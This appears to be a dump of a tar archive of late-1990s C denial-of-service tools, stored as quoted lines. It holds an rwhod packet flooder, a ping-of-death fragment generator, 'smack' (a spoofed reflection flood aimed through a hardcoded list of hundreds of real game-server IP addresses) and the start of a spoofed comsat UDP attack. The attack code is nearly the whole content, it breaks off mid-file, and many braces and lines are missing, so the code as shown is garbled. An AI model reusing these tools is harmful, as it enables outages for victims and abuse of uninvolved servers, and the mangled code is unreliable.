            "#include <sys/types.h> ",
            "#include <netinet/in.h> ",
            "#include <netdb.h> ",
            "#include <sys/socket.h> ",
            "#include <sys/wait.h> ",
            "#define MYPORT 513",
            "int i;",
            "int b;",
            "//ripped out of headers from a real os",
            "struct  outmp {",
            "        char    out_line[8];            /* tty name */ ",
            "        char    out_name[8];            /* user id */",
            "        long    out_time;               /* time on */",
            "};      ",
            "struct  whod {",
            "        char    wd_vers;                /* protocol version # */",
            "        char    wd_type;                /* packet type, see below */",
            "        char    wd_pad[2];",
            "        int     wd_sendtime;            /* time stamp by sender */",
            "        int     wd_recvtime;            /* time stamp applied by receiver */",
            "        char    wd_hostname[32];        /* hosts's name */",
            "        int     wd_loadav[3];           /* load average as in uptime */",
            "        int     wd_boottime;            /* time system booted */",
            "        struct  whoent {",
            "                struct  outmp we_utmp;  /* active tty info */",
            "                int     we_idle;        /* tty idle time */",
            "        } wd_we[1024 / sizeof (struct whoent)];",
            "int main(int argc, char *argv[])",
            "\tint sockfd;",
            "\tstruct sockaddr_in their_addr; /* connector's address information */",
            "\tstruct sockaddr_in ours;",
            "\tstruct hostent *he;",
            "\tint numbytes;",
            "\tstruct whod evil;",
            "\tif (argc != 3) {",
            "\t    fprintf(stderr,\"usage: rwhokill hostname number\\n\");",
            "\t    exit(1);",
            "\tif ((he=gethostbyname(argv[1])) == NULL) {  /* get the host info */",
            "\t    herror(\"gethostbyname\");",
            "\t    exit(1);",
            "\tif ((sockfd = socket(AF_INET, SOCK_DGRAM, 0)) == -1) {",
            "\t    perror(\"socket\");",
            "\t    exit(1);",
            "\ttheir_addr.sin_family = AF_INET;      /* host byte order */",
            "\ttheir_addr.sin_port = htons(MYPORT);  /* short, network byte order */",
            "\ttheir_addr.sin_addr = *((struct in_addr *)he->h_addr);",
            "\tbzero(&(their_addr.sin_zero), 8);     /* zero the rest of the struct */",
            "\tbzero(&ours,sizeof(struct sockaddr));",
            "\tours.sin_family = AF_INET;      /* host byte order */",
            "\tours.sin_port = htons(MYPORT);  /* short, network byte order */",
            "\tbzero(&(ours.sin_zero), 8);     /* zero the rest of the struct */",
            "\tbind(sockfd,(struct sockaddr *)&ours,sizeof(struct sockaddr));",
            "\tbzero(&evil,sizeof(struct whod));",
            "\ti=0;",
            "\tevil.wd_vers=1;",
            "\tevil.wd_type=1;",
            "\t\tfor (b=0;b<atoi(argv[2]);b++)",
            "\t\tfor (i=0;i<32;i++)",
            "\t\t\tevil.wd_hostname[i]=(random()%26)+'A';",
            "\t\tif ((numbytes=sendto(sockfd, &evil, sizeof(struct whod), 0, \\",
            "             \t(struct sockaddr *)&their_addr, sizeof(struct sockaddr))) == -1)",
            "\t\t\tperror(\"recvfrom\");",
            "\t\t\texit(1);",
            "        \t}",
            "\tclose(sockfd);",
            "\treturn 0;",
            "datapool/src/simping.c",
            "0100644",
            "0000000",
            "0000000",
            "00000006046",
            "07100074643",
            "013770",
            "ustar  ",
            "root",
            "root",
            " * simping.c",
            " * Adapted by Simple Nomad <thegnome@fastlane.net> 11-Feb-1997",
            " * Simulate the evil win95 \"ping -l 65510 buggyhost\".",
            " * Based off of win95ping.c by Bill Fenner <fenner@freebsd.org> 22-Oct-1996",
            " * compile using \"cc -o evilping simping.c\"",
            " * Must be run as root to properly grab socket.",
            "#define __BSD_SOURCE",
            "#include <stdio.h>",
            "#include <sys/types.h>",
            "#include <sys/socket.h>",
            "#include <netdb.h>",
            "#include <netinet/in.h>",
            "#include <netinet/in_systm.h>",
            "#include <netinet/ip.h>",
            "#include <netinet/ip_icmp.h>",
            "#define IP_MF 0x2000",
            " * If your kernel doesn't muck with raw packets, #define REALLY_RAW.",
            "#ifdef REALLY_RAW",
            "#define FIX(x)  htons(x)",
            "#else",
            "#define FIX(x)  (x)",
            "#endif",
            "main(int argc, char **argv)",
            "        int s;",
            "        char buf[1500];",
            "        struct ip *ip = (struct ip *)buf;",
            "        struct icmphdr *icmphdr = (struct icmphdr *)(ip + 1);",
            "        struct hostent *hp;",
            "        struct sockaddr_in dst;",
            "        int offset;",
            "        int on = 1;",
            "        bzero(buf, sizeof buf);",
            "        if ((s = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP)) < 0) {",
            "                perror(\"socket\");",
            "                exit(1);",
            "        }",
            "        if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0) {",
            "                perror(\"IP_HDRINCL\");",
            "                exit(1);",
            "        }",
            "        if (argc != 2) {",
            "                fprintf(stderr, \"usage: %s hostname\\n\", argv[0]);",
            "                exit(1);",
            "        }",
            "        if ((hp = gethostbyname(argv[1])) == NULL) {",
            "                if ((ip->ip_dst.s_addr = inet_addr(argv[1])) == -1) {",
            "                        fprintf(stderr, \"%s: unknown host\\n\", argv[1]);",
            "                }",
            "        } else {",
            "                bcopy(hp->h_addr_list[0], &ip->ip_dst.s_addr, hp->h_length);",
            "        }",
            "        printf(\"Sending to %s\\n\", inet_ntoa(ip->ip_dst));",
            "        ip->ip_v = 4;",
            "        ip->ip_hl = sizeof *ip >> 2;",
            "        ip->ip_tos = 0;",
            "        ip->ip_len = FIX(sizeof buf);",
            "        ip->ip_id = htons(4321);",
            "        ip->ip_off = FIX(0);",
            "        ip->ip_ttl = 255;",
            "        ip->ip_p = 1;",
            "        ip->ip_src.s_addr = 0;          /* kernel fills in */",
            "        dst.sin_addr = ip->ip_dst;",
            "        dst.sin_family = AF_INET;",
            "        icmphdr->type = ICMP_ECHO;",
            "        icmphdr->code = 0;",
            "        icmphdr->checksum = htons(~(ICMP_ECHO << 8));",
            "                /* the checksum of all 0's is easy to compute */",
            "        for (offset = 0; offset < 65536; offset += (sizeof buf - sizeof *ip)) {",
            "                ip->ip_off = FIX(offset >> 3);",
            "                if (offset < 65120)",
            "                        ip->ip_off |= FIX(IP_MF);",
            "                else",
            "                        ip->ip_len = FIX(418);  /* make total 65538 */",
            "                if (sendto(s, buf, sizeof buf, 0, (struct sockaddr *)&dst,",
            "                                        sizeof dst) < 0) {",
            "                        fprintf(stderr, \"offset %d: \", offset);",
            "                        perror(\"sendto\");",
            "                }",
            "                if (offset == 0) {",
            "                        icmphdr->type = 0;",
            "                        icmphdr->code = 0;",
            "                        icmphdr->checksum = 0;",
            "                }",
            "        }",
            "datapool/src/smack.c",
            "0100644",
            "0000000",
            "0000000",
            "00000035107",
            "07076364456",
            "013440",
            "ustar  ",
            "root",
            "root",
            "   smack.c [code released - Oct 23rd 1998 by - Iron-lungs]",
            "   http://www.legion2000.org",
            "   Derived: Based on a old D.o.s exploit used to crash large quake servers.",
            "   Overview: sends random Icmp unreachable packets from random ip#'s -",
            "   Result:  Result is a basic lock up on all windows platforms even affects , BSD , Redhat and",
            "   slackware versions. The user will instantly recieve the packets by the 1,000's , resulting",
            "   in a large boost of CPU , aventuly they have no response to their browser , ftp , telnet and",
            "   other such clients as ICQ and mIRc also reset.",
            "   Tip: try using this exploit with the repeat method \"eg: ./smack 127.0.0.1 ; ./smack",
            "   127.0.0.1 \"",
            "   Finishing comments: No responsibility is taken from the results of this script, use at risk.",
            "          /smack.c is a addition for ultrsmack.tar.gz which has yet to be released /",
            "#include <stdio.h>",
            "#include <stdlib.h>",
            "#include <string.h>",
            "#include <fcntl.h>",
            "#include <sys/types.h>",
            "#include <sys/socket.h>",
            "#include <netinet/in.h>",
            "#include <netinet/in_systm.h>",
            "#include <netinet/ip.h>",
            "#include <netinet/udp.h>",
            "#include <sys/uio.h>",
            "#include <unistd.h>",
            "char conn_pack0[] = { -128,0,0,12,1,81,85,65,75,69,0,3 };",
            "char conn_pack1[] = { -1,-1,-1,-1,99,111,110,110,101,99,116,32,34,92,110,111,",
            "                      97,105,109,92,48,92,109,115,103,92,49,92,114,97,116,",
            "                      101,92,50,53,48,48,92,98,111,116,116,111,109,99,111,",
            "                      108,111,114,92,49,98,92,116,111,112,99,111,108,111,114,",
            "                      92,110,97,109,101,92,83,110,111,111,112,121,34,10 };",
            "#define PS0 20+8+12",
            "#define PS1 20+8+strlen(conn_pack1)",
            "char *servers[] = {",
            "\"129.15.3.38:26000:0\",",
            "\"207.123.126.4:26000:0\",",
            "\"129.15.3.38:26001:0\",",
            "\"129.15.3.38:26002:0\",",
            "\"192.107.41.7:26000:0\",",
            "\"157.182.246.58:26000:0\",",
            "\"128.52.42.22:26000:0\",",
            "\"209.51.213.12:26000:0\",",
            "\"209.112.14.200:26000:0\",",
            "\"144.92.218.112:26000:0\",",
            "\"200.239.253.14:26000:0\",",
            "\"146.227.105.5:26000:0\",",
            "\"209.12.13.20:26000:0\",",
            "\"134.147.141.98:26000:0\",",
            "\"137.48.127.127:26000:0\",",
            "\"209.51.192.228:26000:0\"",
            "\"159.134.244.134:26000:0\",",
            "\"207.229.129.193:26000:0\",",
            "\"194.125.2.219:26001:0\",",
            "\"206.98.138.162:26000:0\",",
            "\"134.193.111.241:26000:0\",",
            "\"207.40.196.13:26000:0\",",
            "\"209.26.6.121:26000:0\",",
            "\"208.194.67.16:26000:0\",",
            "\"205.163.58.20:26000:0\",",
            "\"199.247.156.6:26000:0\",",
            "\"12.72.1.37:26000:0\",",
            "\"216.65.157.101:26000:0\",",
            "\"206.103.0.200:26000:0\",",
            "\"207.198.211.22:26000:0\",",
            "\"148.176.238.89:26000:0\",",
            "\"208.255.165.53:26000:0\",",
            "\"208.240.197.32:26000:0\",",
            "\"209.192.31.148:26000:0\",",
            "\"159.134.244.132:26000:0\",",
            "\"195.96.122.8:26000:0\",",
            "\"209.30.67.88:26000:0\",",
            "\"209.36.105.50:26000:0\",",
            "\"62.136.15.45:26000:0\",",
            "\"208.18.129.2:26000:0\",",
            "\"208.0.188.6:26000:0\",",
            "\"208.137.128.24:26000:0\",",
            "\"198.106.23.1:26000:0\",",
            "\"209.122.33.45:26000:0\",",
            "\"208.23.24.79:26000:0\",",
            "\"200.34.211.10:26000:0\",",
            "\"208.45.42.111:26000:0\",",
            "\"203.23.47.43:26000:0\",",
            "\"207.239.192.51:26000:0\",",
            "\"165.166.140.122:26000:0\",",
            "\"207.19.125.13:26000:0\",",
            "\"144.92.229.122:26000:0\",",
            "\"199.202.71.203:26000:0\",",
            "\"200.255.244.2:26000:0\",",
            "\"207.30.184.9:26000:0\",",
            "\"129.186.121.53:26000:0\",",
            "\"204.210.15.71:26000:0\",",
            "\"198.101.39.41:26000:0\",",
            "\"203.45.23.123:26000:0\",",
            "\"205.23.45.223:26000:0\",",
            "\"34.224.14.118:26000:0\",",
            "\"200.24.34.116:26000:0\",",
            "\"192.52.220.101:26000:0\",",
            "\"194.126.80.142:26000:0\",",
            "\"206.171.181.1:26000:0\",",
            "\"208.4.5.9:26000:0\",",
            "\"206.246.194.16:26000:0\",",
            "\"205.139.62.15:26000:0\",",
            "\"204.254.98.15:26000:0\",",
            "\"207.206.116.41:26000:0\",",
            "\"208.130.10.26:26000:0\",",
            "\"207.126.70.69:26000:0\",",
            "\"38.241.229.103:26000:0\",",
            "\"204.170.191.6:26000:0\",",
            "\"144.92.243.243:26000:0\",",
            "\"144.92.111.117:26000:0\",",
            "\"194.229.103.195:26000:0\",",
            "\"208.134.73.42:26000:0\",",
            "\"207.64.79.1:26000:0\",",
            "\"171.64.65.70:26004:0\",",
            "\"207.13.110.4:26000:0\",",
            "\"204.253.208.245:26000:0\",",
            "\"165.166.144.45:26000:0\",",
            "\"128.252.22.47:26000:0\",",
            "\"204.210.15.71:26001:0\",",
            "\"193.88.50.50:26000:0\",",
            "\"209.155.24.25:26000:0\",",
            "\"204.49.131.19:26000:0\",",
            "\"199.67.51.102:26000:0\",",
            "\"207.114.144.200:26000:0\",",
            "\"165.166.140.140:26000:0\",",
            "\"38.233.80.136:26000:0\",",
            "\"204.216.57.249:26000:0\",",
            "\"199.72.175.4:26000:0\",",
            "\"204.91.237.250:26000:0\",",
            "\"206.191.0.209:26000:0\",",
            "\"194.109.6.220:26000:0\",",
            "\"207.67.188.25:26000:0\",",
            "\"160.45.32.176:26000:0\",",
            "\"206.246.194.15:26000:0\",",
            "\"207.65.182.12:26000:0\",",
            "\"204.213.176.8:26000:0\",",
            "\"207.99.85.67:26000:0\",",
            "\"209.172.129.66:26000:0\",",
            "\"132.230.63.23:26000:0\",",
            "\"206.149.144.14:26000:0\",",
            "\"147.188.209.113:26000:0\",",
            "\"204.141.86.42:26000:0\",",
            "\"207.8.164.27:26000:0\",",
            "\"204.254.98.11:26000:0\",",
            "\"204.216.126.251:26000:0\",",
            "\"207.206.65.5:26000:0\",",
            "\"209.12.170.11:26000:0\",",
            "\"131.111.226.98:26000:0\",",
            "\"194.65.5.103:26000:0\",",
            "\"204.202.54.95:26000:0\",",
            "\"204.97.179.4:26000:0\",",
            "\"24.0.147.54:26000:0\",",
            "\"207.170.48.24:26000:0\",",
            "\"199.217.218.8:26000:0\",",
            "\"207.166.192.85:26000:0\",",
            "\"206.154.148.145:26000:0\",",
            "\"206.248.16.16:26000:0\",",
            "\"200.241.188.3:26000:0\",",
            "\"204.177.71.10:26000:0\",",
            "\"140.233.207.207:26000:0\",",
            "\"207.218.51.13:26000:0\",",
            "\"194.109.6.217:26000:0\",",
            "\"207.236.41.30:26000:0\",",
            "\"195.162.196.42:26000:0\",",
            "\"209.49.51.98:26020:0\",",
            "\"198.106.166.188:26000:0\",",
            "\"207.239.212.113:26000:0\",",
            "\"165.91.3.91:26000:0\",",
            "\"128.95.25.184:26666:0\",",
            "\"128.2.237.78:26001:0\",",
            "\"128.2.237.78:26003:0\",",
            "\"207.254.73.2:26000:0\",",
            "\"208.225.207.3:26666:0\",",
            "\"171.64.65.70:26666:0\",",
            "\"208.225.207.3:26001:0\",",
            "\"128.2.237.78:26000:0\",",
            "\"129.21.113.71:26000:0\",",
            "\"195.74.96.45:26000:0\",",
            "\"206.129.112.27:26000:0\",",
            "\"199.67.51.101:26000:0\",",
            "\"38.156.101.2:26000:0\",",
            "\"204.177.39.44:26000:0\",",
            "\"207.173.16.53:26000:0\",",
            "\"207.175.30.130:26123:0\",",
            "\"128.52.38.15:26000:0\",",
            "\"204.49.131.19:26666:0\",",
            "\"129.21.114.129:26666:0\",",
            "\"128.2.237.78:26002:0\",",
            "\"18.238.0.24:26001:0\",",
            "\"140.247.155.208:26000:0\",",
            "\"208.137.139.8:26000:0\",",
            "\"141.219.81.85:26000:0\",",
            "\"208.203.244.13:26000:0\",",
            "\"208.137.128.24:26020:0\",",
            "\"140.180.143.197:26666:0\",",
            "\"205.189.151.3:26000:0\",",
            "\"199.247.126.23:26000:0\",",
            "\"18.238.0.24:26002:0\",",
            "\"206.98.138.166:26000:0\",",
            "\"128.2.74.204:26000:0\",",
            "\"198.87.96.254:26000:0\",",
            "\"204.209.212.5:26000:0\",",
            "\"207.171.0.68:26002:0\",",
            "\"159.134.244.133:26000:0\",",
            "\"195.170.128.5:26000:0\",",
            "\"198.164.230.15:26000:0\",",
            "\"130.236.249.227:26000:0\",",
            "\"193.88.50.50:26001:0\",",
            "\"143.44.100.20:26000:0\",",
            "\"129.15.3.39:26000:0\",",
            "\"205.219.23.3:26000:0\",",
            "\"205.177.27.190:26000:0\",",
            "\"207.172.7.66:26000:0\",",
            "\"209.144.56.16:26000:0\",",
            "\"128.164.141.5:26000:0\",",
            "\"129.2.237.36:26000:0\",",
            "\"206.98.138.165:26000:0\",",
            "\"194.100.105.71:26000:0\",",
            "\"194.158.161.28:26000:0\",",
            "\"203.87.2.13:26000:0\",",
            "\"141.219.83.69:26000:0\",",
            "\"198.83.6.70:26000:0\",",
            "\"35.8.144.96:26000:0\",",
            "\"206.196.57.130:26000:0\",",
            "\"206.31.102.16:26000:0\",",
            "\"207.23.43.3:26000:0\",",
            "\"207.18.86.50:26000:0\",",
            "\"207.87.203.20:26000:0\",",
            "\"198.161.102.213:26000:0\",",
            "\"24.1.226.74:26000:0\",",
            "\"207.207.32.130:26000:0\",",
            "\"165.166.140.160:26000:0\",",
            "\"204.248.210.20:26000:0\",",
            "\"207.87.203.28:26000:0\",",
            "\"165.166.140.111:26000:0\",",
            "\"24.3.132.9:26000:0\",",
            "\"205.217.206.189:26000:0\",",
            "\"207.99.85.69:26000:0\",",
            "\"192.124.43.75:26000:0\",",
            "\"199.72.175.156:26000:0\",",
            "\"209.98.3.217:26000:0\",",
            "\"206.154.138.8:26000:0\",",
            "\"205.199.137.12:26000:0\",",
            "\"204.177.184.31:26000:0\",",
            "\"192.124.43.73:26000:0\",",
            "\"171.64.65.70:26000:0\",",
            "\"165.91.21.113:26000:0\",",
            "\"198.17.249.14:26000:0\",",
            "\"156.46.147.17:26000:0\",",
            "\"207.13.5.18:26000:0\",",
            "\"208.212.201.9:26000:0\",",
            "\"207.96.243.5:26000:0\",",
            "\"206.196.153.201:26000:0\",",
            "\"204.171.58.6:26000:0\",",
            "\"140.180.143.197:26000:0\",",
            "\"207.3.64.52:26000:0\",",
            "\"207.65.218.15:26000:0\",",
            "\"194.42.225.247:26000:0\",",
            "\"205.228.248.27:26000:0\",",
            "\"204.216.126.250:26000:0\",",
            "\"128.230.33.90:26000:0\",",
            "\"128.163.161.105:26000:0\",",
            "\"208.0.122.12:26000:0\",",
            "\"206.53.116.243:26000:0\",",
            "\"199.76.206.54:26000:0\",",
            "\"194.239.134.18:26000:0\",",
            "\"208.153.58.17:26000:0\",",
            "\"206.147.58.45:26000:0\",",
            "\"204.220.36.31:26000:0\",",
            "\"207.239.212.107:26000:0\",",
            "\"206.230.18.20:26000:0\",",
            "\"195.18.128.10:26000:0\",",
            "\"151.198.193.6:26000:0\",",
            "\"208.0.122.11:26000:0\",",
            "\"206.149.80.99:26000:0\",",
            "\"207.239.212.244:26000:0\",",
            "\"129.128.54.168:26000:0\",",
            "\"194.229.154.41:26000:0\",",
            "\"207.51.86.22:26000:0\",",
            "\"207.201.91.8:26000:0\",",
            "\"205.216.83.5:26000:0\",",
            "\"208.201.224.211:26000:0\",",
            "\"194.144.237.50:26000:0\",",
            "\"147.83.61.32:26000:0\",",
            "\"136.201.40.50:26000:0\",",
            "\"132.235.197.72:26000:0\",",
            "\"195.173.25.34:26000:0\",",
            "\"194.143.8.153:26000:0\",",
            "\"194.109.6.218:26000:0\",",
            "\"18.238.0.24:26000:0\",",
            "\"129.21.112.194:26000:0\",",
            "\"128.253.185.87:26000:0\",",
            "\"206.183.143.4:26000:0\",",
            "\"130.234.16.21:26000:0\",",
            "\"148.202.1.5:26000:0\",",
            "\"167.114.26.50:26000:0\",",
            "\"169.197.1.154:26000:0\",",
            "\"207.0.164.8:26000:0\",",
            "\"207.243.123.2:26000:0\",",
            "\"207.106.42.14:26000:0\",",
            "\"198.161.102.18:26000:0\",",
            "\"202.218.50.24:26000:0\",",
            "\"205.139.35.22:26000:0\",",
            "\"193.74.114.41:26000:0\",",
            "\"129.15.3.37:26000:0\",",
            "\"130.240.195.72:26000:0\",",
            "\"205.164.220.20:26000:0\",",
            "\"209.90.128.16:26000:0\",",
            "\"200.241.222.88:26000:0\",",
            "\"194.213.72.22:26000:0\",",
            "\"206.112.1.31:26000:0\",",
            "\"132.230.153.50:26000:0\",",
            "\"206.251.130.20:26000:0\",",
            "\"195.238.2.30:26000:0\",",
            "\"193.164.183.3:26000:0\",",
            "\"150.156.210.232:26000:0\",",
            "\"193.13.231.151:26000:0\",",
            "\"200.18.178.7:26000:0\",",
            "\"206.20.111.7:26000:0\",",
            "\"192.89.182.26:26000:0\",",
            "\"207.53.96.12:26000:0\",",
            "\"194.64.176.5:26000:0\",",
            "\"203.19.214.28:26000:0\",",
            "\"130.241.142.10:26000:0\",",
            "\"207.48.50.10:26000:0\",",
            "\"129.13.209.22:26000:0\",",
            "\"194.243.65.2:26000:0\",",
            "\"194.19.128.13:26000:0\",",
            "\"202.27.184.4:26000:0\",",
            "\"194.204.5.25:26000:0\",",
            "\"200.241.93.2:26000:0\",",
            "\"194.125.148.2:26000:0\",",
            "\"130.237.233.111:26000:0\",",
            "\"139.174.248.165:26000:0\",",
            "\"207.78.244.40:26000:0\",",
            "\"195.74.0.69:26000:0\",",
            "\"203.55.240.1:26000:0\",",
            "\"203.61.156.162:26000:0\",",
            "\"203.61.156.164:26000:0\",",
            "\"195.90.193.138:26000:0\",",
            "\"195.94.179.5:26000:0\",",
            "\"203.23.237.110:26000:0\",",
            "\"200.18.178.14:26000:0\",",
            "\"200.248.241.1:26000:0\",",
            "\"203.17.103.34:26000:0\",",
            "\"131.151.52.105:26000:0\",",
            "\"200.250.234.39:26000:0\",",
            "\"203.29.160.21:26000:0\",",
            "\"206.41.136.94:26000:0\",",
            "\"202.49.244.17:26000:0\",",
            "\"196.25.1.132:26000:0\",",
            "\"206.230.102.9:26000:0\",",
            "\"206.25.117.125:26000:0\",",
            "\"200.246.5.28:26000:0\",",
            "\"200.255.96.24:26000:0\",",
            "\"195.94.179.25:26000:0\",",
            "\"195.224.47.44:26000:0\",",
            "\"200.248.241.2:26000:0\",",
            "\"203.15.24.46:26000:0\",",
            "\"199.217.218.7:26000:0\",",
            "\"200.246.248.9:26000:0\",",
            "\"200.246.227.44:26000:0\",",
            "\"202.188.101.246:26000:0\",",
            "\"207.212.176.26:26000:0\",",
            "\"200.255.218.41:26000:0\",",
            "\"200.246.0.248:26000:0\",",
            "\"209.29.65.3:26000:0\",",
            "\"203.32.8.197:26000:0\",",
            "\"200.248.149.31:26000:0\",",
            "\"200.246.52.4:26000:0\",",
            "\"203.17.23.13:26000:0\",",
            "\"206.196.57.130:26001:0\",",
            "\"130.63.74.16:26000:0\",",
            "\"203.16.135.34:26000:0\",",
            "\"195.66.200.101:26000:0\",",
            "\"199.217.218.007:26000:0\",",
            "\"203.30.239.5:26000:0\",",
            "\"128.206.92.47:26000:0\",",
            "\"203.17.23.9:26000:0\",",
            "\"205.139.59.121:26000:0\",",
            "\"136.159.102.88:26000:0\",",
            "\"207.152.95.9:26000:0\",",
            "\"205.197.242.62:26000:0\",",
            "\"204.119.24.237:26000:0\",",
            "\"200.246.163.6:26000:0\",",
            "\"206.96.251.44:26000:0\",",
            "\"203.61.156.165:26000:0\",",
            "\"207.0.129.183:26000:0\",",
            "\"194.117.157.74:26000:0\",",
            "\"206.83.174.10:26000:0\",",
            "\"204.171.44.26:26000:0\",",
            "\"204.216.27.8:26000:0\",",
            "\"148.217.2.200:26000:0\",",
            "\"193.13.231.149:26000:0\",",
            "\"204.157.39.7:26000:0\",",
            "\"208.194.67.16:26012:0\",",
            "\"137.123.210.80:26000:0\",",
            "\"149.106.37.197:26000:0\",",
            "\"207.207.248.20:26000:0\",",
            "\"143.195.150.40:26000:0\",",
            "\"204.90.102.49:26000:0\",",
            "\"209.48.89.1:26000:0\",",
            "\"130.126.195.94:26000:0\",",
            "\"134.193.111.241:26500:0\",",
            "\"205.218.60.98:26001:0\",",
            "\"205.218.60.98:26000:0\",",
            "\"165.91.20.158:26000:0\",",
            "\"206.248.16.16:26001:0\",",
            "\"206.248.16.16:26002:0\",",
            "\"149.156.159.100:26000:0\",",
            "\"163.1.138.204:26000:0\",",
            "\"204.177.71.250:26000:0\",",
            "\"207.25.220.40:26000:0\",",
            "\"206.25.206.10:26000:0\",",
            "\"206.186.72.103:26000:0\",",
            "\"206.154.216.100:26000:0\",",
            "\"204.253.208.225:26000:0\",",
            "\"203.59.24.229:26000:0\",",
            "\"200.255.216.11:26000:0\",",
            "\"128.143.244.38:26000:0\",",
            "\"128.113.161.123:26000:0\",",
            "\"128.138.149.62:26000:0\",",
            "\"128.175.46.96:26000:0\",",
            "\"204.210.15.62:26000:0\",",
            "\"204.210.15.62:26001:0\",",
            "\"206.83.174.9:26000:0\",",
            "NULL",
            "int i, s, fl, ret;",
            "unsigned int sp, dp;",
            "struct in_addr src, dst;",
            "struct sockaddr_in addr;",
            "char pack[1024];",
            "struct ip *iph;",
            "struct udphdr *udph;",
            "int read_data(void);",
            "int parse_in(char *);",
            "int addserv(char *, unsigned int, char);",
            "void main(int argc, char *argv[])",
            "  iph = (struct ip *)pack;",
            "  udph = (struct udphdr *)(iph + 1);",
            "  if (argc < 2) {",
            "     printf(\"Usage: ./smack <target to fuck>\\n\", argv[0]);",
            "     exit(-1);",
            "  printf(\"Slinging Packets.....\\n\");",
            "  src.s_addr = inet_addr(argv[1]);",
            "  if (src.s_addr == -1) {",
            "     printf(\"Invalid source IP: %s\\n\", argv[1]);",
            "     exit(-1);",
            "  s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);",
            "  if (s == -1) {",
            "     perror(\"socket\");",
            "     exit(-1);",
            "  fl = 1;",
            "  ret = setsockopt(s, IPPROTO_IP, IP_HDRINCL, &fl, sizeof(int));",
            "  if (ret == -1) {",
            "     perror(\"setsockopt\");",
            "     exit(-1);",
            "  bzero((char *)&addr, sizeof(addr));",
            "  addr.sin_family = AF_INET;",
            "  read_data();",
            "  printf(\"UnFed.\\n\");",
            "int parse_in(char *in)",
            "  int i, n, c, m, ret;",
            "  char ip[16], tmp[6], mode, tmp2;",
            "  unsigned int port;",
            "  bzero(ip, 16); bzero(tmp, 6); mode = 0; port = 0; n = 0; c = 0; m = 0;",
            "  tmp2 = 0;",
            "  for (i = 0; i < strlen(in); i++) {",
            "      if (in[i] != ' ') {",
            "         if (in[i] != ':') {",
            "            if (m == 0) {",
            "               ip[c] = in[i];",
            "               c++;",
            "            }",
            "            if (m == 1) {",
            "               tmp[c] = in[i];",
            "               c++;",
            "            }",
            "            if (m == 2) {",
            "               tmp2 = in[i];",
            "               break;",
            "            }",
            "         }",
            "         else {",
            "           m++; c = 0;",
            "         }",
            "      }",
            "  port = (unsigned int)atoi(tmp);",
            "  mode = (tmp2 - 48);",
            "  addserv(ip, port, mode);",
            "  return ret;",
            "int read_data(void)",
            "  int i;",
            "  char in[1024];",
            "  for (i = 0; i < 32767; i++) {",
            "      if (servers[i] == NULL)",
            "         break;",
            "      parse_in(servers[i]);",
            "  return 1;",
            "int addserv(char *ip, unsigned int port, char mode)",
            "    bzero(pack, 1024);",
            "    dp = port;",
            "    iph->ip_v = IPVERSION;",
            "    iph->ip_hl = sizeof *iph >> 2;",
            "    iph->ip_tos = 0;",
            "    iph->ip_ttl = 40;",
            "#ifdef BSD",
            "    if (mode == 0)",
            "       iph->ip_len = PS0;",
            "    else",
            "       iph->ip_len = PS1;",
            "#else",
            "    if (mode == 0)",
            "       iph->ip_len = htons(PS0);",
            "    else",
            "       iph->ip_len = htons(PS1);",
            "#endif",
            "    iph->ip_p = IPPROTO_UDP;",
            "    iph->ip_src = src;",
            "    dst.s_addr = inet_addr(ip);",
            "    if (dst.s_addr == -1) {",
            "       printf(\"Invalid destination IP: %s\\n\", ip);",
            "    }",
            "    addr.sin_port = htons(port);",
            "    addr.sin_addr.s_addr = dst.s_addr;",
            "    iph->ip_dst = dst;",
            "#ifdef BSD",
            "    udph->uh_dport = htons(dp);",
            "    if (mode == 0) {",
            "       udph->uh_ulen  = htons(sizeof *udph + 12);",
            "       udph->uh_sport = htons(rand());",
            "    }",
            "    else {",
            "       udph->uh_ulen  = htons(sizeof *udph + strlen(conn_pack1));",
            "       udph->uh_sport = htons(27001);",
            "    }",
            "#else",
            "    udph->dest   = htons(dp);",
            "    if (mode == 0) {",
            "       udph->len  = htons(sizeof *udph + 12);",
            "       udph->source = htons(rand());",
            "    }",
            "    else {",
            "       udph->len  = htons(sizeof *udph + strlen(conn_pack1));",
            "       udph->source = htons(27001);",
            "    }",
            "#endif",
            "    if (mode == 0) {",
            "       memcpy(udph + 1, conn_pack0, 12);",
            "       ret = sendto(s, pack, PS0, 0, (struct sockaddr *)&addr, sizeof(addr));",
            "    }",
            "    else {",
            "       memcpy(udph + 1, conn_pack1, strlen(conn_pack1));",
            "       ret = sendto(s, pack, PS1, 0, (struct sockaddr *)&addr, sizeof(addr));",
            "    }",
            "    if (ret == -1) {",
            "       perror(\"sendto\");",
            "       exit(-1);",
            "    }",
            "datapool/src/spiffit.c",
            "0100644",
            "0000000",
            "0000000",
            "00000005647",
            "07051164074",
            "013777",
            "ustar  ",
            "root",
            "root",
            "/* spiffit.c v1 by neophyte@efnet",
            "   Based on source by Arny to send spoofed UDP datagrams, could be used as  ",
            "   a DoS against users with 'biff y' set on machines running in.comsat --",
            "   The original idea was by sygma (biffit.c), I just added the spoof",
            "   routines to show that it was possible to get around his suggested",
            "   hosts.allow fix.",
            "   Tested on:",
            "   Slackware and Redhat Linux distros,",
            "   FreeBSD 2.2.5-Stable",
            "   NetBSD 1.2",
            "   BSD boxes appear to be greatly affected by this (I've had unconfirmed",
            "   reports of all services needing to be restarted).",
            "   Fix: Users should set `biff n` to avoid screenfulls of new-mail",
            "   messages, admins on severly affected boxes should look at shutting off",
            "   the in.comsat daemon.",
            "   Notes: Use this to test your own network, this source if for",
            "   educational purposes only.",
            "   Greets: Werd up to sygma, #j00nix, the snickers and EXiLE lads.",
            "#include<sys/types.h>",
            "#include<sys/socket.h>",
            "#include<netinet/in_systm.h>",
            "#include<netinet/in.h>",
            "#include<netinet/ip.h>",
            "#include<netinet/udp.h>",
            "#include<errno.h>",
            "#include<string.h>",
            "#include<netdb.h>",
            "#include<arpa/inet.h>",
            "#include<stdio.h>",
            "#define MYPORT 512",
            "struct sockaddr sa;",
            "main(int argc,char **argv)",
            "int fd, killloop;",
            "int x=1;",
            "char message[10];",
            "struct sockaddr_in *p;",
            "struct hostent *he;",
            "u_char gram[38]=",
            "\t0x45,\t0x00,\t0x00,\t0x26,",
            "\t0x12,\t0x34,\t0x00,\t0x00,",
            "\t0xFF,\t0x11,\t0,\t0,",
            "\t0,\t0,\t0,\t0,",
            "\t0,\t0,\t0,\t0,",
            "\t0,\t0,\t0,\t0,",
            "\t0x00,\t0x12,\t0x00,\t0x00",
            "   if(argc!=6) {",
